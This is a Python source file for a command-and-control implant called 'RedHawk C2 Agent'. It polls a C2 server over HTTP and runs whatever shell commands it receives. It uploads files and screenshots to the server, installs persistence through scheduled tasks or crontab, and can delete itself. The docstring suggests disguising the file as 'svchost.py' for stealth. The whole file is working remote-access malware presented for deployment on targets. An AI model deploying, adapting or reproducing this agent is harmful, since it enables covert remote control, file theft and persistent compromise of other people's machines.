"""
RedHawk C2 Agent — Python reverse-http agent
==============================================
Deploy this on a target to establish C2 communication.
Usage: python c2_agent.py <c2_url>
Example: python c2_agent.py http://192.168.1.100:8080

For stealth, rename to something innocuous like "update.py" or "svchost.py"
"""

import urllib.request
import urllib.parse
import json
import socket
import subprocess
import sys
import os
import time
import uuid
import base64
import platform

# ── Configuration (overridable via args) ──
C2_URL = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080"
HEARTBEAT_INTERVAL = 5  # seconds between checkins
JITTER_MAX = 3           # max jitter seconds
AGENT_ID = uuid.uuid4().hex[:8]
PERSISTENT = False       # set True to install persistence

# Gather system info
try:
    HOSTNAME = socket.gethostname()
except:
    HOSTNAME = "unknown"

try:
    USERNAME = subprocess.check_output('whoami', shell=True).decode().strip()
except:
    USERNAME = "unknown"

OS_INFO = f"{platform.system()} {platform.release()} ({platform.version()})"

try:
    PUBLIC_IP = urllib.request.urlopen('https://api.ipify.org', timeout=5).read().decode().strip()
except:
    PUBLIC_IP = "unknown"


def http_post(endpoint: str, data: dict) -> dict:
    """Send JSON POST to C2 server."""
    url = f"{C2_URL}{endpoint}"
    payload = json.dumps(data).encode()
    req = urllib.request.Request(url, data=payload,
        headers={
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        },
        method="POST")
    
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            return json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        if e.code == 404:
            return {}  # server doesn't support this endpoint yet
        return {"error": f"HTTP {e.code}"}
    except Exception as e:
        return {"error": str(e)}


def execute_command(cmd: str) -> str:
    """Execute a shell command and return output."""
    try:
        # Handle special commands
        cmd = cmd.strip()
        
        if cmd.startswith("cd "):
            new_dir = cmd[3:].strip()
            os.chdir(new_dir)
            return f"Changed directory to: {os.getcwd()}"
        
        if cmd == "pwd":
            return os.getcwd()
        
        if cmd == "exit":
            sys.exit(0)
        
        if cmd.startswith("download "):
            # Upload a file to C2
            filepath = cmd[9:].strip()
            return upload_file(filepath)
        
        if cmd == "persist":
            return install_persistence()
        
        if cmd == "screenshot":
            return take_screenshot()
        
        # Generic command execution
        result = subprocess.check_output(cmd, shell=True,
            stderr=subprocess.STDOUT, timeout=60)
        return result.decode('utf-8', errors='replace')
    
    except subprocess.TimeoutExpired:
        return "[TIMEOUT] Command exceeded 60 seconds"
    except Exception as e:
        return f"[ERROR] {str(e)}"


def upload_file(filepath: str) -> str:
    """Upload a file to the C2 server."""
    if not os.path.exists(filepath):
        return f"[ERROR] File not found: {filepath}"
    
    try:
        with open(filepath, 'rb') as f:
            content = base64.b64encode(f.read()).decode()
        
        result = http_post("/c2/upload", {
            "filename": os.path.basename(filepath),
            "content": content,
            "agentId": AGENT_ID,
        })
        
        if "error" in result:
            return f"[ERROR] Upload failed: {result['error']}"
        
        size = os.path.getsize(filepath)
        return f"[OK] Uploaded {os.path.basename(filepath)} ({size} bytes)"
    
    except Exception as e:
        return f"[ERROR] Upload failed: {str(e)}"


def take_screenshot() -> str:
    """Take a screenshot (platform-specific)."""
    try:
        if sys.platform == "win32":
            # Use PowerShell on Windows
            output = subprocess.check_output(
                ['powershell', '-ExecutionPolicy', 'Bypass', '-Command',
                 'Add-Type -AssemblyName System.Windows.Forms;'
                 'Add-Type -AssemblyName System.Drawing;'
                 '$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;'
                 '$b=New-Object System.Drawing.Bitmap $s.Width,$s.Height;'
                 '$g=[System.Drawing.Graphics]::FromImage($b);'
                 '$g.CopyFromScreen($s.X,$s.Y,0,0,$s.Size);'
                 '$ms=New-Object System.IO.MemoryStream;'
                 '$b.Save($ms,[System.Drawing.Imaging.ImageFormat]::Png);'
                 '[System.Convert]::ToBase64String($ms.ToArray())'],
                timeout=30)
            b64data = output.decode().strip()
            
            # Send to C2
            result = http_post("/c2/upload", {
                "filename": f"screenshot_{AGENT_ID}_{int(time.time())}.png",
                "content": b64data,
                "agentId": AGENT_ID,
            })
            return f"[OK] Screenshot captured and uploaded"
        else:
            # Linux/macOS
            subprocess.check_call(['import', '-window', 'root', '/tmp/screenshot.png'], timeout=10)
            return upload_file('/tmp/screenshot.png')
    except Exception as e:
        return f"[ERROR] Screenshot failed: {str(e)}"


def install_persistence() -> str:
    """Install persistence mechanism."""
    try:
        if sys.platform == "win32":
            script_path = os.path.abspath(__file__)
            # Create scheduled task
            cmd = (f'schtasks /create /tn "RedHawkAgent" /tr "python {script_path} {C2_URL}" '
                   f'/sc minute /mo 5 /f')
            subprocess.check_call(cmd, shell=True)
            return "[OK] Persistence installed via scheduled task (every 5 min)"
        
        elif sys.platform.startswith('linux'):
            # Crontab
            script_path = os.path.abspath(__file__)
            cron_line = f"*/5 * * * * python3 {script_path} {C2_URL} >/dev/null 2>&1"
            subprocess.check_call(f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -', shell=True)
            return "[OK] Persistence installed via crontab"
        
        else:
            return "[ERROR] Persistence not supported on this platform"
    except Exception as e:
        return f"[ERROR] Persistence failed: {str(e)}"


def self_destruct() -> str:
    """Remove agent and persistence."""
    try:
        if sys.platform == "win32":
            subprocess.check_call('schtasks /delete /tn "RedHawkAgent" /f', shell=True)
        
        elif sys.platform.startswith('linux'):
            subprocess.check_call('crontab -l | grep -v "RedHawkAgent" | crontab -', shell=True)
        
        script_path = os.path.abspath(__file__)
        os.remove(script_path)
        return "[OK] Self-destruct complete"
    except Exception as e:
        return f"[ERROR] Self-destruct failed: {str(e)}"


def main():
    print(f"[*] RedHawk C2 Agent starting...")
    print(f"[*] Agent ID: {AGENT_ID}")
    print(f"[*] C2 URL: {C2_URL}")
    print(f"[*] Hostname: {HOSTNAME}")
    print(f"[*] User: {USERNAME}")
    print(f"[*] OS: {OS_INFO}")
    print(f"[*] IP: {PUBLIC_IP}")
    print()

    checkin_count = 0

    while True:
        try:
            # Check in with C2
            response = http_post("/c2/checkin", {
                "id": AGENT_ID,
                "hostname": HOSTNAME,
                "username": USERNAME,
                "os": OS_INFO,
                "ip": PUBLIC_IP,
            })

            # Check for tasks
            if response.get("task") and response["task"].get("command"):
                task_id = response["task"]["id"]
                command = response["task"]["command"]
                
                print(f"[{time.strftime('%H:%M:%S')}] Task received: {command[:80]}")
                
                # Execute
                output = execute_command(command)
                
                # Send result
                http_post("/c2/result", {
                    "taskId": task_id,
                    "agentId": AGENT_ID,
                    "output": output,
                    "status": "completed",
                })
                
                print(f"[{time.strftime('%H:%M:%S')}] Task completed ({len(output)} bytes output)")

            checkin_count += 1
            if checkin_count % 12 == 0:  # ~every minute
                print(f"[*] Heartbeats sent: {checkin_count}")

            # Jittered sleep
            jitter = JITTER_MAX * (0.5 + hash(str(time.time())) % 100 / 100)
            time.sleep(HEARTBEAT_INTERVAL + jitter)

        except KeyboardInterrupt:
            print("\n[*] Agent shutting down...")
            break
        except Exception as e:
            print(f"[!] Error: {e}")
            time.sleep(30)  # Back off on errors


if __name__ == "__main__":
    main()
